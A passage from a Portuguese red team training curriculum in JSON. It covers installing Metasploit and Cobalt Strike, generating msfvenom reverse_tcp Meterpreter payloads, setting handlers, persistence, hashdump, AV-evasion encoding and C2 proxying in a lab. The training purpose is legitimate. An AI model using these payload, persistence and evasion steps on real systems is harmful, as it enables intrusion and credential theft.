                                  "estimatedTime": "10-20 minutos",
                                  "materials": [
                                    "Terminal",
                                    "Internet",
                                    "RVM installer (opcional)"
                                  ],
                                  "tips": "Use rbenv ou RVM para gerenciar múltiplas versões Ruby em ambientes de teste; evite sudo com gem installs quando possível.",
                                  "learningObjective": "Aprender a instalar e verificar linguagens de script essenciais para frameworks de exploit como Metasploit.",
                                  "commonMistakes": [
                                    "Instalar versão errada de Ruby incompatível com MSF",
                                    "Conflitos entre system Ruby e gerenciadores como RVM",
                                    "Não instalar dev headers causando falhas em gems"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar e configurar PostgreSQL",
                                  "subSteps": [
                                    "Instale PostgreSQL: 'sudo apt install -y postgresql postgresql-contrib'.",
                                    "Inicie o serviço: 'sudo systemctl start postgresql' e habilite: 'sudo systemctl enable postgresql'.",
                                    "Crie usuário msf: 'sudo -u postgres createuser -P -D -R -S -s msf'.",
                                    "Defina senha quando solicitado (anote-a para uso posterior).",
                                    "Verifique status: 'sudo systemctl status postgresql' deve mostrar active."
                                  ],
                                  "verification": "Conexão testada com 'sudo -u postgres psql -l' lista bancos e serviço rodando.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Terminal",
                                    "PostgreSQL package"
                                  ],
                                  "tips": "Use senhas fortes para msf user; configure pg_hba.conf para autenticação local se necessário.",
                                  "learningObjective": "Dominar instalação e configuração básica de SGBDs para suportar bancos de payloads e sessões no Metasploit.",
                                  "commonMistakes": [
                                    "Não habilitar serviço causando falhas no boot",
                                    "Senha fraca ou esquecida para msf user",
                                    "Falhar em criar user com superuser privileges"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Instalar Metasploit Framework e inicializar banco de dados",
                                  "subSteps": [
                                    "Instale MSF: 'sudo apt install -y metasploit-framework'.",
                                    "Inicialize banco: 'msfdb init' (use senha msf definida anteriormente).",
                                    "Verifique inicialização: 'msfdb status' mostra database running.",
                                    "Teste lançamento: 'msfconsole -q' e saia com 'exit'.",
                                    "Atualize MSF: 'msfupdate' ou 'sudo apt update && sudo apt upgrade metasploit-framework'."
                                  ],
                                  "verification": "'msfconsole' inicia sem erros de dependências e 'db_status' mostra 'connected to msf'.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Terminal",
                                    "Dependências prévias instaladas"
                                  ],
                                  "tips": "Execute msfdb reinit se houver problemas; backup do banco antes de updates.",
                                  "learningObjective": "Completar a configuração end-to-end do MSF, integrando Ruby, Postgres e framework principal.",
                                  "commonMistakes": [
                                    "Executar msfdb init sem Postgres rodando",
                                    "Ignorar erros de gems durante install",
                                    "Não testar msfconsole imediatamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de Red Team, um analista prepara um VM Kali fresco: atualiza sistema, instala Ruby 3.0, Postgres com user msf, instala metasploit-framework e roda 'msfdb init'. Em seguida, lança msfconsole para carregar módulos de exploit contra uma target simulada como Metasploitable.",
                              "finalVerifications": [
                                "Ruby --version >=2.7",
                                "PostgreSQL serviço active e user msf criado",
                                "Metasploit-framework instalado via dpkg -l",
                                "msfdb init completado sem erros",
                                "msfconsole inicia e db_status connected",
                                "Sem erros de dependências em logs (/var/log/metasploit)"
                              ],
                              "assessmentCriteria": [
                                "Todos os comandos executados sem falhas críticas",
                                "Versões corretas de Ruby e Postgres verificadas",
                                "Banco de dados MSF inicializado e acessível",
                                "Ambiente reproduzível em VM nova",
                                "Tempo total dentro de 1 hora",
                                "Documentação de senhas e configs salva"
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas Linux (APT, serviços systemd)",
                                "Programação em Ruby (gem management)",
                                "Gerenciamento de Bancos de Dados (PostgreSQL setup)",
                                "Infraestrutura de Segurança (ambientes isolados VM)",
                                "DevOps (automação de installs via scripts Ansible)"
                              ],
                              "realWorldApplication": "Em operações de penetração reais (Red Team), preparar ambientes Kali com MSF é o primeiro passo para simular ataques avançados, como pivoting em redes corporativas, garantindo exploits confiáveis sem falhas de dependências durante engajamentos autorizados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.4.2.2",
                            "name": "Baixar e compilar o Metasploit",
                            "description": "Clonar repositório GitHub oficial (git clone https://github.com/rapid7/metasploit-framework), executar bundle install para gems, resolver dependências faltantes e inicializar com msfconsole.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente de Sistema",
                                  "subSteps": [
                                    "Verifique se o sistema operacional é compatível (preferencialmente Kali Linux ou Ubuntu 20.04+).",
                                    "Instale pré-requisitos: atualize o sistema com 'sudo apt update && sudo apt upgrade'.",
                                    "Instale Ruby (versão 2.7+): 'sudo apt install ruby-full ruby-dev'.",
                                    "Instale Git: 'sudo apt install git'.",
                                    "Instale Bundler: 'sudo gem install bundler'."
                                  ],
                                  "verification": "Execute 'ruby --version', 'git --version' e 'bundle --version' para confirmar instalações sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "Acesso root/sudo",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Use uma VM isolada para evitar conflitos no host principal.",
                                  "learningObjective": "Configurar dependências do sistema para suportar o Metasploit.",
                                  "commonMistakes": [
                                    "Ignorar versão do Ruby (deve ser 2.7+)",
                                    "Executar sem sudo onde necessário",
                                    "Não atualizar pacotes do sistema"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Clonar o Repositório Oficial do Metasploit",
                                  "subSteps": [
                                    "Navegue para um diretório apropriado: 'cd /opt' ou '~/tools'.",
                                    "Clone o repositório: 'git clone https://github.com/rapid7/metasploit-framework.git'.",
                                    "Entre no diretório: 'cd metasploit-framework'.",
                                    "Verifique o clone: 'ls' para listar arquivos como msfconsole.",
                                    "Atualize se necessário: 'git pull' para versão mais recente."
                                  ],
                                  "verification": "Diretório 'metasploit-framework' existe com arquivos como 'msfconsole' e 'Gemfile'.",
                                  "estimatedTime": "5 minutos",
                                  "materials": [
                                    "Git instalado",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Clone em /opt para instalação global e fácil acesso.",
                                  "learningObjective": "Baixar o código-fonte oficial via Git de forma segura.",
                                  "commonMistakes": [
                                    "Clonar repo não-oficial (risco de malware)",
                                    "Clonar em diretório sem permissões de escrita",
                                    "Ignorar git pull para updates"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar Dependências Ruby com Bundle",
                                  "subSteps": [
                                    "No diretório metasploit-framework, execute 'bundle install'.",
                                    "Aguarde instalação de gems (pode demorar 10-20 min).",
                                    "Se erros de dependências, instale pacotes faltantes como 'sudo apt install libpcap-dev libgmp-dev'.",
                                    "Resolva conflitos de gems: 'bundle update' se necessário.",
                                    "Verifique instalação: 'bundle list' para listar gems instaladas."
                                  ],
                                  "verification": "Comando 'bundle install' completa sem erros fatais; 'bundle check' retorna 'The dependencies are satisfied'.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Bundler instalado",
                                    "Ruby gems mirror acessível"
                                  ],
                                  "tips": "Execute em background se possível; use '--without development test' para acelerar.",
                                  "learningObjective": "Gerenciar e instalar dependências Ruby para frameworks de segurança.",
                                  "commonMistakes": [
                                    "Executar bundle sem entrar no diretório correto",
                                    "Ignorar erros de dependências do sistema",
                                    "Usar sudo no bundle (pode quebrar permissões)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Inicializar e Verificar o Metasploit",
                                  "subSteps": [
                                    "Execute './msfconsole' no diretório metasploit-framework.",
                                    "Aguarde banner de inicialização e prompt 'msf6 >'.",
                                    "Teste comando básico: 'version' para confirmar versão.",
                                    "Saia com 'exit' e reinicie para validar persistência.",
                                    "Opcional: Crie alias 'echo \"source ~/.msf6/config\" >> ~/.bashrc'."
                                  ],
                                  "verification": "msfconsole inicia sem erros, exibe banner e responde a comandos como 'help'.",
                                  "estimatedTime": "5 minutos",
                                  "materials": [
                                    "Instalação anterior completa"
                                  ],
                                  "tips": "Monitore logs em ~/.msf4/logs para depuração.",
                                  "learningObjective": "Validar instalação funcional do Metasploit Framework.",
                                  "commonMistakes": [
                                    "Executar msfconsole sem bundle install",
                                    "Problemas de PATH (use ./msfconsole)",
                                    "Ignorar warnings no startup"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de Red Team, clone e instale Metasploit em uma VM Kali para simular um ataque de exploit contra uma máquina vulnerável como Metasploitable, usando módulos como eternalblue.",
                              "finalVerifications": [
                                "msfconsole inicia em menos de 30 segundos sem erros.",
                                "Comando 'db_status' mostra banco de dados conectado.",
                                "Módulos carregam: 'search eternalblue' retorna resultados.",
                                "Git status limpo e bundle check passa.",
                                "Reinicialização persiste sem re-instalação.",
                                "Nenhuma dependência pendente em bundle list."
                              ],
                              "assessmentCriteria": [
                                "Passos executados sequencialmente sem skips.",
                                "Todas dependências resolvidas autonomamente.",
                                "msfconsole funcional com comandos básicos.",
                                "Ambiente limpo, sem erros de permissão ou conflitos.",
                                "Documentação de troubleshooting se erros ocorreram.",
                                "Tempo total dentro do estimado (45-60 min)."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Uso de Git e Ruby/Bundler.",
                                "Sistemas Operacionais: Gerenciamento de pacotes Linux (apt).",
                                "Redes: Preparação para ferramentas de pentest.",
                                "Desenvolvimento de Software: Instalação de frameworks open-source."
                              ],
                              "realWorldApplication": "Profissionais de Red Team usam Metasploit em avaliações de penetração autorizadas para identificar vulnerabilidades em redes corporativas, simulando ataques reais e recomendando defesas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.4.2.1"
                            ]
                          },
                          {
                            "id": "10.1.7.4.2.3",
                            "name": "Configurar módulos e testar exploits",
                            "description": "Atualizar banco de módulos com msfupdate, configurar handlers (ex: multi/handler), testar payload simples como windows/meterpreter/reverse_tcp em ambiente controlado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Atualizar o banco de módulos do Metasploit",
                                  "subSteps": [
                                    "Abra o terminal no Kali Linux como root ou com sudo.",
                                    "Execute o comando 'msfupdate' para baixar as atualizações mais recentes dos módulos e exploits.",
                                    "Aguarde o processo de download e instalação concluir sem erros.",
                                    "Verifique a versão atualizada executando 'msfconsole -v'.",
                                    "Reinicie o msfconsole para carregar os novos módulos."
                                  ],
                                  "verification": "Execute 'msfconsole' e digite 'search eternalblue' para confirmar que módulos recentes aparecem na lista.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": "Kali Linux com Metasploit instalado, conexão à internet estável",
                                  "tips": "Execute em horários de baixa latência de rede para downloads mais rápidos.",
                                  "learningObjective": "Compreender a importância de manter o framework atualizado para exploits recentes.",
                                  "commonMistakes": "Esquecer de usar sudo, resultando em falha de permissões; interromper o processo prematuramente."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar um handler multi/handler",
                                  "subSteps": [
                                    "Inicie o msfconsole com 'msfconsole'.",
                                    "Carregue o handler digitando 'use exploit/multi/handler'.",
                                    "Defina o payload com 'set payload windows/meterpreter/reverse_tcp'.",
                                    "Configure LHOST com o IP da máquina atacante: 'set LHOST [seu_IP]' (use ifconfig para obter IP).",
                                    "Configure LPORT: 'set LPORT 4444' e execute 'exploit' ou 'run' para iniciar o listener."
                                  ],
                                  "verification": "O console mostra '[*] Started reverse TCP handler on [IP]:4444' sem erros.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "msfconsole aberto, VM Windows alvo configurada em rede isolada",
                                  "tips": "Use 'show options' após cada set para validar configurações.",
                                  "learningObjective": "Aprender a configurar listeners para capturar sessões reverse shell.",
                                  "commonMistakes": "IP incorreto no LHOST, causando falha na conexão; porta já em uso."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar e preparar um payload simples",
                                  "subSteps": [
                                    "No msfconsole, carregue msfvenom: saia do handler e execute 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=[seu_IP] LPORT=4444 -f exe -o payload.exe'.",
                                    "Transfira o payload.exe para a VM Windows alvo via USB, share ou scp em ambiente controlado.",
                                    "Na VM Windows, desative temporariamente o antivírus para testes.",
                                    "Execute o payload.exe na VM Windows.",
                                    "Volte ao handler no Kali e observe a sessão Meterpreter se conectar."
                                  ],
                                  "verification": "Sessão Meterpreter aparece no handler com 'meterpreter >' prompt.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "msfvenom, VM Windows vulnerável (ex: Windows 7 sem patches), rede isolada",
                                  "tips": "Teste conectividade com ping entre atacante e vítima antes.",
                                  "learningObjective": "Dominar geração de payloads personalizados para testes de penetração.",
                                  "commonMistakes": "Payload gerado com IP/porta errados; firewall bloqueando na vítima."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e validar o exploit em ambiente controlado",
                                  "subSteps": [
                                    "Na sessão Meterpreter, execute comandos básicos: 'sysinfo', 'getuid', 'screenshot'.",
                                    "Teste persistência: 'run persistence -U -i 10 -p 4444 -r [seu_IP]'.",
                                    "Saia da sessão com 'exit' e reinicie o handler para testar reconexão.",
                                    "Registre logs: 'spool /root/msf_test.log' antes dos testes.",
                                    "Limpe o ambiente: delete payload e reverta VM."
                                  ],
                                  "verification": "Comandos Meterpreter executam sem erros e persistência reconecta após reinício.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Sessão Meterpreter ativa, ferramentas de snapshot para VMs",
                                  "tips": "Sempre use snapshots de VM para reset rápido após testes.",
                                  "learningObjective": "Validar eficácia do exploit e post-exploração em cenários simulados.",
                                  "commonMistakes": "Não limpar traços, comprometendo testes futuros; ignorar logs de erros."
                                }
                              ],
                              "practicalExample": "Em um lab com Kali Linux (atacante, IP 192.168.1.100) e VM Windows 7 (vítima), atualize MSF, configure multi/handler em LPORT 4444, gere payload.exe com msfvenom, transfira via share, execute na vítima e ganhe shell Meterpreter para dump de hashes com 'hashdump'.",
                              "finalVerifications": [
                                "msfupdate completa sem erros e novos módulos visíveis.",
                                "Handler inicia e captura sessão reverse_tcp.",
                                "Payload executa e abre Meterpreter shell estável.",
                                "Comandos post-exploit (sysinfo, screenshot) funcionam.",
                                "Persistência reconecta após reinício da vítima.",
                                "Logs capturam toda a sessão sem falhas."
                              ],
                              "assessmentCriteria": [
                                "Atualização do MSF realizada corretamente em <15 min.",
                                "Handler configurado com opções corretas (LHOST/LPORT).",
                                "Payload gerado e transferido sem detecção em lab.",
                                "Sessão Meterpreter interativa com >5 comandos testados.",
                                "Persistência implementada e validada.",
                                "Ambiente limpo pós-teste (sem artefatos)."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de TCP reverse shells e portas.",
                                "Sistemas Operacionais: Navegação em Windows via Meterpreter.",
                                "Programação: Scripts em Ruby para módulos MSF personalizados.",
                                "Ética: Discussão de uso legal em Red Team autorizado."
                              ],
                              "realWorldApplication": "Em operações de Red Team autorizadas, configurar handlers e testar payloads iniciais permite simular ataques reais, validar defesas e treinar equipes de resposta a incidentes em pentests profissionais."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.4.2.2"
                            ]
                          },
                          {
                            "id": "10.1.7.4.2.4",
                            "name": "Otimizar para uso em Red Team",
                            "description": "Configurar rc scripts personalizados, integrar com Armitage ou msfvenom para geração de payloads, ajustar configurações de firewall e proxy para C2.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar RC Scripts Personalizados no Metasploit",
                                  "subSteps": [
                                    "Localize o diretório de configuração do Metasploit em /usr/share/metasploit-framework/scripts/resource/",
                                    "Crie um novo arquivo RC chamado redteam_custom.rc usando um editor como nano ou vim",
                                    "Adicione comandos essenciais para Red Team, como 'use exploit/multi/handler', 'set payload windows/meterpreter/reverse_tcp', 'set LHOST <IP>', 'set LPORT 4444', e 'exploit -j'",
                                    "Inclua aliases personalizados, como 'alias quickhandler use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp'",
                                    "Salve o arquivo e teste carregando com 'msfconsole -r redteam_custom.rc'"
                                  ],
                                  "verification": "Execute 'msfconsole -r redteam_custom.rc' e confirme que o handler inicia sem erros e responde a comandos básicos",
                                  "estimatedTime": "20-30 minutes",
                                  "materials": "Kali Linux com Metasploit instalado, editor de texto (nano/vim), terminal",
                                  "tips": "Use variáveis dinâmicas como $lhost no RC para facilitar reutilização em diferentes cenários",
                                  "learningObjective": "Dominar a automação de sessões Metasploit via scripts RC para eficiência em operações Red Team",
                                  "commonMistakes": "Esquecer de especificar payloads corretos para o alvo (ex: Windows vs Linux), causando falhas no handler"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Integrar msfvenom para Geração de Payloads Personalizados",
                                  "subSteps": [
                                    "Gere um payload básico com msfvenom: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > redteam_payload.exe'",
                                    "Integre o payload no RC script adicionando 'generate -f exe -o /tmp/payload.exe' ou carregue manualmente no msfconsole",
                                    "Configure encoders para evasão: 'msfvenom --payload windows/meterpreter/reverse_tcp LHOST=<IP> -e x86/shikata_ga_nai -i 5 -f exe'",
                                    "Teste o payload gerado executando-o em um ambiente controlado (VM alvo) e verifique conexão no handler",
                                    "Automatize via RC: Adicione linha no RC para chamar msfvenom externamente com 'command: msfvenom ...'"
                                  ],
                                  "verification": "Gere payload, execute em VM alvo e confirme sessão Meterpreter abre no msfconsole via RC",
                                  "estimatedTime": "25-40 minutes",
                                  "materials": "msfvenom (parte do Metasploit), VM alvo (ex: Windows Metasploitable), RC script do Step 1",
                                  "tips": "Sempre use encoders múltiplos e opções como -x para bind com executáveis legítimos para stealth",
                                  "learningObjective": "Aprender a gerar payloads otimizados e integrá-los seamless ao workflow Metasploit para Red Team",
                                  "commonMistakes": "Não alinhar LHOST/LPORT entre msfvenom e handler, resultando em falhas de conexão"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Armitage para Gerenciamento Gráfico",
                                  "subSteps": [
                                    "Inicie o PostgreSQL: 'service postgresql start' e configure teamserver: 'armitage' no terminal",
                                    "Conecte ao teamserver via Armitage GUI e importe o RC script: File > Scripting > Load redteam_custom.rc",
                                    "Configure hosts e payloads no Armitage, sincronizando com msfvenom para gerar e deployar",
                                    "Crie workflows personalizados no Armitage usando o RC para automação de ataques comuns",
                                    "Teste integração: Gere payload no Armitage, lance handler e simule sessão"
                                  ],
                                  "verification": "Armitage carrega RC sem erros, gera payload via msfvenom e gerencia sessão Meterpreter graficamente",
                                  "estimatedTime": "30-45 minutes",
                                  "materials": "Armitage instalado (apt install armitage), PostgreSQL, RC e payloads dos steps anteriores",
                                  "tips": "Use Armitage para colaboração em equipe Red Team, configurando múltiplos usuários no teamserver",
                                  "learningObjective": "Habilitar gerenciamento visual e colaborativo de operações MSF via Armitage para cenários Red Team complexos",
                                  "commonMistakes": "PostgreSQL não iniciado, causando falha na conexão do Armitage ao teamserver"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Ajustar Configurações de Firewall e Proxy para C2",
                                  "subSteps": [
                                    "Verifique firewall atual: 'ufw status' ou 'iptables -L', libere portas C2: 'ufw allow 4444/tcp' e 'ufw allow 80/tcp'",
                                    "Configure proxy se necessário (ex: SOCKS via msf): 'use auxiliary/server/socks_proxy; set SRVPORT 1080; run'",
                                    "Integre proxy no RC: Adicione 'use auxiliary/server/socks_proxy; set SRVPORT 1080; exploit -j'",
                                    "Teste conectividade: Use netcat ou nmap para verificar portas abertas e proxy funcional",
                                    "Otimize regras iptables para persistência: 'iptables-save > /etc/iptables.rules' e carregue no boot"
                                  ],
                                  "verification": "Teste handler C2 através de firewall/proxy; confirme conexões externas via VM ou rede simulada",
                                  "estimatedTime": "20-35 minutes",
                                  "materials": "ufw/iptables, proxy tools no MSF, rede de teste com VMs",
                                  "tips": "Use portas não padrão (ex: 8080 em vez de 80) e regras específicas por IP para maior segurança",
                                  "learningObjective": "Garantir comunicação C2 resiliente em ambientes com restrições de rede para operações Red Team reais",
                                  "commonMistakes": "Regras de firewall muito permissivas, expondo portas desnecessárias e violando OPSEC"
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team simulado, configure um RC script para handler em 4444, gere payload msfvenom para uma VM Windows alvo, integre no Armitage para visualização, e ajuste ufw para permitir C2 via proxy SOCKS, simulando bypass de rede corporativa.",
                              "finalVerifications": [
                                "RC script carrega e executa handlers automaticamente sem erros",
                                "Payloads msfvenom integram perfeitamente e estabelecem sessões Meterpreter",
                                "Armitage gerencia sessões graficamente com sincronia total ao MSF",
                                "Firewall permite tráfego C2 bidirecional; proxy SOCKS encaminha comandos corretamente",
                                "Configuração persiste após reboot e suporta múltiplas sessões simultâneas",
                                "OPSEC mantida: Sem logs excessivos ou portas expostas desnecessariamente"
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude dos RC scripts (automação de 80%+ das tarefas comuns)",
                                "Eficiência na geração e evasão de payloads (sucesso em 100% dos testes controlados)",
                                "Integração seamless com Armitage (gerenciamento de 5+ sessões sem falhas)",
                                "Resiliência de C2 (conexões estáveis sob firewall/proxy em cenários variados)",
                                "Adesão a OPSEC (zero vazamentos identificáveis em scans nmap)",
                                "Tempo total de setup abaixo de 2 horas para ambiente completo"
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas Linux (firewall/iptables configuração)",
                                "Redes e Protocolos (proxies SOCKS, portas TCP/UDP)",
                                "Scripting e Automação (Ruby no MSF, bash para integração)",
                                "Desenvolvimento de Software Seguro (encoders e ofuscação de payloads)",
                                "Ética e Governança em Cibersegurança (OPSEC em simulações Red Team)"
                              ],
                              "realWorldApplication": "Em pentests autorizados e exercícios de Red Team para organizações, essa otimização permite setups rápidos de C2 em ambientes restritos, simulando APTs reais enquanto mantém stealth e escalabilidade para equipes de resposta a incidentes."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.4.2.3"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.4.3",
                        "name": "Instalação do Cobalt Strike",
                        "description": "Configuração do Cobalt Strike, ferramenta comercial avançada para operações de Red Team com beacons e C2.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.4.3.1",
                            "name": "Adquirir licença e preparar VM isolada",
                            "description": "Obter trial ou licença oficial de cobaltstrike.com, configurar máquina virtual (Kali ou Ubuntu) com Java 11+ instalado via 'sudo apt install openjdk-11-jre', firewall desabilitado para testes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Obter licença ou trial do Cobalt Strike",
                                  "subSteps": [
                                    "Acesse o site oficial cobaltstrike.com",
                                    "Navegue até a seção de downloads ou trials",
                                    "Preencha o formulário de solicitação de trial com dados válidos (nome, email corporativo, empresa)",
                                    "Verifique o email para o link de download e chave de licença",
                                    "Baixe o arquivo de instalação do Cobalt Strike"
                                  ],
                                  "verification": "Confirme a recepção do email com chave de licença e arquivo baixado disponível localmente",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Email corporativo ou profissional",
                                    "Navegador web atualizado"
                                  ],
                                  "tips": "Use um email profissional para aumentar chances de aprovação; evite emails genéricos como Gmail pessoal",
                                  "learningObjective": "Entender o processo oficial de aquisição de ferramentas comerciais de segurança cibernética",
                                  "commonMistakes": [
                                    "Usar dados falsos que levam a rejeição",
                                    "Ignorar termos de uso do trial",
                                    "Baixar de fontes não oficiais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar máquina virtual isolada com Kali Linux ou Ubuntu",
                                  "subSteps": [
                                    "Instale um hypervisor como VirtualBox ou VMware Workstation (gratuito para uso pessoal)",
                                    "Baixe a ISO oficial do Kali Linux ou Ubuntu LTS do site oficial (kali.org ou ubuntu.com)",
                                    "Crie uma nova VM com pelo menos 4GB RAM, 2 CPUs, 50GB disco e rede em modo NAT ou Host-Only para isolamento",
                                    "Instale o SO na VM a partir da ISO, configure usuário e senha fortes",
                                    "Atualize o sistema com 'sudo apt update && sudo apt upgrade -y'"
                                  ],
                                  "verification": "VM bootando corretamente no hypervisor, com desktop acessível e comandos de update executados sem erros",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Hypervisor instalado (VirtualBox/VMware)",
                                    "ISO oficial Kali/Ubuntu",
                                    "Máquina host com 8GB+ RAM disponível"
                                  ],
                                  "tips": "Atribua rede Host-Only para total isolamento; snapshot a VM antes de prosseguir",
                                  "learningObjective": "Dominar configuração de ambientes virtuais isolados para testes de segurança",
                                  "commonMistakes": [
                                    "Usar rede Bridged expondo à rede real",
                                    "Alocar recursos insuficientes causando lentidão",
                                    "Não criar snapshot inicial"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar Java 11+ na VM",
                                  "subSteps": [
                                    "Abra o terminal na VM",
                                    "Execute 'sudo apt update' para atualizar repositórios",
                                    "Instale OpenJDK 11 com 'sudo apt install openjdk-11-jre -y'",
                                    "Verifique a instalação com 'java -version' (deve mostrar versão 11+)",
                                    "Configure JAVA_HOME se necessário: 'export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64'"
                                  ],
                                  "verification": "Comando 'java -version' retorna OpenJDK 11 ou superior sem erros",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "VM com Kali/Ubuntu rodando",
                                    "Acesso root/sudo"
                                  ],
                                  "tips": "Use openjdk-11-jre-headless para ambientes sem GUI se aplicável; reinicie terminal após instalação",
                                  "learningObjective": "Aprender a gerenciar dependências de runtime em distribuições Linux para ferramentas Java-based",
                                  "commonMistakes": [
                                    "Instalar versão errada de Java",
                                    "Esquecer de atualizar repositórios",
                                    "Não verificar versão pós-instalação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desabilitar firewall e finalizar preparação da VM",
                                  "subSteps": [
                                    "Desabilite UFW com 'sudo ufw disable' (ou iptables se UFW não presente)",
                                    "Verifique status com 'sudo ufw status' (deve mostrar inactive)",
                                    "Copie o arquivo de licença e instalador do Cobalt Strike para a VM via shared folder ou SCP",
                                    "Crie diretório dedicado: 'mkdir ~/cobaltstrike && cd ~/cobaltstrike'",
                                    "Teste conectividade básica: 'ping 8.8.8.8' para confirmar rede funcional"
                                  ],
                                  "verification": "Firewall desabilitado confirmado, arquivos do Cobalt Strike na VM, ping responde",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Arquivos baixados do Step 1",
                                    "Ferramenta de compartilhamento de arquivos (shared folder no hypervisor)"
                                  ],
                                  "tips": "Reative firewall após testes reais; use apenas em ambiente isolado para evitar riscos",
                                  "learningObjective": "Configurar rede e segurança básica em VMs para simulações de Red Team",
                                  "commonMistakes": [
                                    "Desabilitar firewall na host em vez da guest",
                                    "Expor VM à internet sem necessidade",
                                    "Não copiar arquivos corretamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team, configure esta VM isolada para instalar Cobalt Strike e simular um beacon C2 conectando a um listener local, testando detecção por EDR simulado sem risco à rede real.",
                              "finalVerifications": [
                                "Licença/trial do Cobalt Strike obtida e arquivos na VM",
                                "VM Kali/Ubuntu rodando com 4GB+ RAM e snapshot criado",
                                "Java 11+ instalado e verificado via 'java -version'",
                                "Firewall desabilitado e rede isolada (Host-Only)",
                                "Diretório ~/cobaltstrike pronto com instalador",
                                "Ping de teste confirma conectividade básica"
                              ],
                              "assessmentCriteria": [
                                "Todas as subSteps executadas sem erros documentados",
                                "Verificações de cada step confirmadas com screenshots ou logs",
                                "Ambiente totalmente isolado (sem exposição externa)",
                                "Tempo total dentro de 80 minutos com eficiência",
                                "Documentação de configurações salvas em relatório",
                                "Identificação e correção de qualquer commonMistake"
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento de pacotes APT em Linux",
                                "Redes: Configurações de hypervisor e isolamento de rede",
                                "Programação: Dependências Java para ferramentas C2",
                                "Ética em TI: Uso legal de trials e ambientes controlados",
                                "Infraestrutura: Virtualização e alocação de recursos"
                              ],
                              "realWorldApplication": "Profissionais de Red Team usam VMs isoladas com Cobalt Strike para validar táticas de persistência e C2 em contratos de pentest, garantindo conformidade legal e zero impacto em produção."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.4.3.2",
                            "name": "Instalar e inicializar o cliente/servidor",
                            "description": "Extrair arquivo JAR baixado, executar './teamserver <IP> <senha>' para servidor C2, conectar cliente com 'java -jar cobaltstrike.jar', configurar listener HTTP/HTTPS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente e Extrair o Arquivo JAR",
                                  "subSteps": [
                                    "Verifique se o Java 11 ou superior está instalado executando 'java -version'.",
                                    "Crie um diretório dedicado, como /opt/cobaltstrike, usando 'sudo mkdir /opt/cobaltstrike && sudo chown $USER:$USER /opt/cobaltstrike'.",
                                    "Baixe o arquivo JAR do Cobalt Strike (se não tiver) e mova para o diretório criado.",
                                    "Extraia o conteúdo do JAR: 'unzip cobaltstrike.jar' ou use um gerenciador de arquivos para extrair.",
                                    "Gere ou defina uma senha forte para o teamserver (mínimo 12 caracteres, alfanumérico)."
                                  ],
                                  "verification": "Confirme a extração listando arquivos com 'ls' e veja linux_x64/teamserver; Java versão exibida corretamente.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
